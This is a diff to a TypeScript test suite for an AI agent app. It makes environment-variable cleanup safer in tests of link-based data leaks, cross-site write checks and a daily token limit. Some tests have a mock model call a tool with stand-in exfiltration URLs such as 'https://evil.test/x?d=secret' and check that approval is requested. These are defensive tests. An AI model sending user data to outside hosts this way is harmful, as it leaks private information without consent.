@@ -41,9 +41,10 @@ describe('data leaving through a link', () => {
     expect(p.approval.requestReason).toContain('https://evil.test/a.png?d=Анна')
   })
   it('a download by address asks and shows the address', async () => {
-    process.env.AGENT_ALL_TOOLS = '1'
-    const parts = await talk(new MockLanguageModelV4({ doStream: [call('upload_photo', { url: 'https://evil.test/x?d=secret' })] as never }), { trustWrites: true })
-    delete process.env.AGENT_ALL_TOOLS
+    const parts = await (async () => {
+      process.env.AGENT_ALL_TOOLS = '1'
+      try { return await talk(new MockLanguageModelV4({ doStream: [call('upload_photo', { url: 'https://evil.test/x?d=secret' })] as never }), { trustWrites: true }) } finally { delete process.env.AGENT_ALL_TOOLS }
+    })()
     const p = parts.find((x) => x.type === 'tool-upload_photo')
     expect(p.state).toBe('approval-requested')
     expect(p.approval.requestReason).toContain('evil.test/x?d=secret')
@@ -73,10 +74,15 @@ describe('cross-site writes', () => {
     expect(fromOurPages(h({ origin: 'https://evil.test' }))).toBe(false)
     expect(fromOurPages(h({ origin: 'null' }))).toBe(false)
     expect(fromOurPages(h({ origin: 'https://family.up.railway.app', host: 'internal:8080', 'x-forwarded-host': 'family.up.railway.app' }))).toBe(true)
+    const hadDomain = process.env.RAILWAY_PUBLIC_DOMAIN
     process.env.RAILWAY_PUBLIC_DOMAIN = 'family.up.railway.app'
-    expect(fromOurPages(h({ origin: 'https://family.up.railway.app', host: 'internal:8080' }))).toBe(true)
-    expect(fromOurPages(h({ origin: 'https://evil.test', host: 'internal:8080' }))).toBe(false)
-    delete process.env.RAILWAY_PUBLIC_DOMAIN
+    try {
+      expect(fromOurPages(h({ origin: 'https://family.up.railway.app', host: 'internal:8080' }))).toBe(true)
+      expect(fromOurPages(h({ origin: 'https://evil.test', host: 'internal:8080' }))).toBe(false)
+    } finally {
+      if (hadDomain === undefined) delete process.env.RAILWAY_PUBLIC_DOMAIN
+      else process.env.RAILWAY_PUBLIC_DOMAIN = hadDomain
+    }
     expect(fromOurPages(h({ 'sec-fetch-site': 'cross-site' }))).toBe(false)
     expect(fromOurPages(h({}))).toBe(false)
   })
@@ -91,10 +97,15 @@ describe('the owner key cannot be run down', () => {
     expect(overLimit('burner', t + 61_000)).toBeNull()
   })
   it('the daily limit stops everyone until the next day', () => {
+    const had = process.env.AGENT_DAILY_TOKENS
     process.env.AGENT_DAILY_TOKENS = '100'
-    countTokens(150)
-    expect(overLimit('anyone')).toMatch(/Дневной/)
-    delete process.env.AGENT_DAILY_TOKENS
+    try {
+      countTokens(150)
+      expect(overLimit('anyone')).toMatch(/Дневной/)
+    } finally {
+      if (had === undefined) delete process.env.AGENT_DAILY_TOKENS
+      else process.env.AGENT_DAILY_TOKENS = had
+    }
   })
 })
 
